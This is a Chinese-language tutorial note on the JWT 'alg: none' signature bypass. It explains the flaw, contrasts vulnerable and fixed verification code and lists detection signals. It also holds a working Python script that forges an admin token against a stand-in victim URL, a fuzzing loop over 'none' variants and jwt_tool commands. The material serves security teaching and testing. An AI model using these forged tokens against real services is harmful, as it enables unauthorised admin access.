# JWT `alg: none` 无签名绕过

## 原理

JWT 规范 (RFC 7519) 允许 `alg: "none"` 表示不签名，用于调试场景。如果服务端的 JWT 库**未显式禁用 `none` 算法**，攻击者可将 Header 的 `alg` 改为 `none`，Payload 任意伪造，Signature 留空，服务端照单全收。

```
┌─────────────────────────────────────────────────────┐
│ 正常流程                                             │
│   Client ─[HS256 Token]──▶ Server                   │
│           Header{alg:HS256}                          │
│           Payload{sub:user}                          │
│           Sig{HMAC(K, H.P)}                          │
│                               verify(H.P, Sig, K)   │
│                               ✓ → 200               │
├─────────────────────────────────────────────────────┤
│ 攻击流程                                             │
│   Attacker ─[none Token]──▶ Server                  │
│             Header{alg:none}                         │
│             Payload{sub:admin,role:admin}            │
│             Sig{}  ← 空或任意值                      │
│                               verify()?             │
│                               若未禁用none → skip    │
│                               ✗ → 200 (绕过!)        │
└─────────────────────────────────────────────────────┘
```

## 伪代码：服务端漏洞逻辑

```python
# 漏洞代码（简化）
def verify_token(token):
    header = b64decode(token.split('.')[0])
    payload = b64decode(token.split('.')[1])
    sig = token.split('.')[2]

    if header['alg'] == 'none':
        # BUG: 直接返回 payload，未验证签名
        return payload

    if header['alg'] == 'HS256':
        key = get_secret_key()
        expected = hmac_sha256(header + '.' + payload, key)
        if sig == expected:
            return payload
    return None
```

```python
# 正确代码
ALLOWED_ALGORITHMS = ['HS256', 'RS256']  # 固定白名单，不含 none

def verify_token(token):
    header = b64decode(token.split('.')[0])
    if header['alg'] not in ALLOWED_ALGORITHMS:
        raise InvalidAlgorithmError(f"Algorithm {header['alg']} not allowed")
    # ... 正常验证
```

## 伪代码：攻击脚本

```python
# attack_alg_none.py
import base64
import json
import requests

def b64url_encode(data: dict) -> str:
    """Base64URL 编码，去掉末尾 ="""
    json_str = json.dumps(data, separators=(',', ':'))
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_token(payload: dict) -> str:
    """
    伪造 alg=none 的 JWT
    """
    header = {"alg": "none", "typ": "JWT"}
    encoded_header = b64url_encode(header)
    encoded_payload = b64url_encode(payload)
    # Signature 留空
    return f"{encoded_header}.{encoded_payload}."

# --- 攻击入口 ---
TARGET = "https://victim.com/api/admin"

# 原始低权限 token（可选，仅用于对比）
original_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx"

# 构造高权限 token
malicious_payload = {
    "sub": "admin",
    "role": "admin",
    "isAdmin": True,
    "iat": 9999999999       # 时间戳随意
}
forged = forge_token(malicious_payload)

# 发送
resp = requests.get(TARGET, headers={"Authorization": f"Bearer {forged}"})
if resp.status_code == 200 and "admin" in resp.text:
    print(f"[+] Bypass success! Token: {forged}")
else:
    print(f"[-] Failed: {resp.status_code}")
```

## 伪代码：变种绕过

```python
# 变种 1: 大小写混淆
HEADER_VARIANTS = [
    {"alg": "none"},       # 标准
    {"alg": "None"},       # 大写 N
    {"alg": "NONE"},       # 全大写
    {"alg": "NoNe"},       # 混合
]

# 变种 2: 算法数组注入（部分库解析缺陷）
HEADER_VARIANT_ARRAY = {"alg": ["none", "HS256"]}
# 解释: 库取 alg[0] 判断算法，但取 alg[1] 做验证 → 冲突

# 变种 3: 空 alg
HEADER_VARIANT_EMPTY = {"alg": ""}

# 变种 4: 不存在的算法
HEADER_VARIANT_FAKE = {"alg": "FAKE"}

# 批量测试
def test_all_variants(target_url, payload):
    variants = [
        {"alg": "none"}, {"alg": "None"}, {"alg": "NONE"},
        {"alg": "NoNe"}, {"alg": ["none", "HS256"]},
        {"alg": ""},     {"alg": "FAKE"},
    ]
    for header in variants:
        token = b64url_encode(header) + "." + b64url_encode(payload) + "."
        resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"})
        print(f"  {header['alg']!r:20s} → {resp.status_code}")
        if resp.status_code not in (401, 403):
            print(f"    [!] Possible bypass!")
```

## 检测信号

- `alg` 改为 `none` 后，响应从 `401/403` 变为 `200`
- 错误信息出现 `"alg None is not allowed"` 说明库已防护
- 无任何异常响应时 → 大概率签名根本没被验证（直接进入 §2.4）

## 工具命令

```bash
# jwt_tool alg=none 扫描
python3 jwt_tool.py <token> -X n

# 手动构造
python3 -c "
import base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```
